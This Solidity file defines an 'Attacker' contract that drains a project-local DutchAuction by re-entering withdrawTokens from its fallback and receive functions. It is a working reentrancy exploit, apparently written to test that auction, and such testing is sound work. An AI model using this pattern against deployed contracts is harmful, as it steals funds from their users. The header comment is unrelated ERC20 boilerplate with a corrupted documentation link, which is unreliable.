// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*
What is ERC20 token? Watch this video to understand:
https://www.youtube.com/watch?v=cqZhNzZoMh8

Documentation:
https://docs.openzeppelin.com/cGLDToken.balanceOfontracts/2.x/erc20
*/
import "../contracts/DutchAuction.sol";

contract Attacker{
    DutchAuction private dutchAuction; 
    constructor(address _dutchAuctionAddress) {
        dutchAuction = DutchAuction(_dutchAuctionAddress);
    }

    function placeBid() external payable{
        dutchAuction.placeBid{value : msg.value}();
    }

    function attack() external{
        dutchAuction.withdrawTokens();
    }

    fallback() external payable {
        if (address(dutchAuction).balance >= 1 wei) {
            dutchAuction.withdrawTokens();
        }
    }

    receive() external payable{
        if (address(dutchAuction).balance >= 1 wei) {
            dutchAuction.withdrawTokens();
        }
    }
}


